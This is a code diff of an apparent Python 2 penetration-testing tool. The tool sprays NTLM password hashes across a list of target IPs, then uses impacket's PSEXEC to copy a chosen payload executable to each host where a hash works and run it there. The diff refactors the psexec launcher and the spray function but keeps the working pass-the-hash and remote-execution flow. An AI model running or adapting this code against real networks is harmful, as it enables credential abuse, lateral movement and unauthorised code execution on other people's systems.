@@ -22,18 +22,10 @@ class timeout:
         signal.alarm(0)
 
 t = blessings.Terminal()
-targetsprayhash = []
-targetipseperated = []
-workinghashes = []
-targetpassword=None
-command=""
-path=""
-copyFile=""
 
-def RunPsexec(exeFile,targetusername,psexechash,targetdomain,targetpassword,psexecip):
-    print "test2"
-    PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
-                           hashes=psexechash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
+def StartPsexec(exeFile,targetusername,psexechash,targetdomain,psexecip):
+    PSEXEC = psexec.PSEXEC(command="", path="", exeFile=exeFile, copyFile="", protocols=None, username=targetusername,
+                           hashes=psexechash, domain=targetdomain, password=None, aesKey=None, doKerberos=False)
     print t.bold_green + "\n[*] Starting Psexec...." + t.normal
     try:
         PSEXEC.run(psexecip)
@@ -41,6 +33,9 @@ def RunPsexec(exeFile,targetusername,psexechash,targetdomain,targetpassword,psex
         print t.bold_red + "[*] Clean Up Failed, Remove Manually with Shell"
 
 def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
+    targetsprayhash = []
+    targetipseperated = []
+    workinghashes = []
     print t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile
     if not hashfile:
         targethash = raw_input("[*] Enter Hashes Seperated by Comma: ")
@@ -97,9 +92,9 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
         if want_to_psexec.lower() == "y" or want_to_psexec == "":
             for hash in workinghashes:
                 psexechash,psexecip = hash.split(",")
-                print "test"
+                print exeFile,targetusername,psexechash,targetdomain,psexecip
                 b = multiprocessing.Process(
-                    target=RunPsexec, args=(exeFile,targetusername,psexechash,targetdomain,targetpassword,psexecip))
+                    target=StartPsexec, args=(exeFile,targetusername,psexechash,targetdomain,psexecip))
                 if __name__ == "__main__":
                     b.daemon=False
                 else:
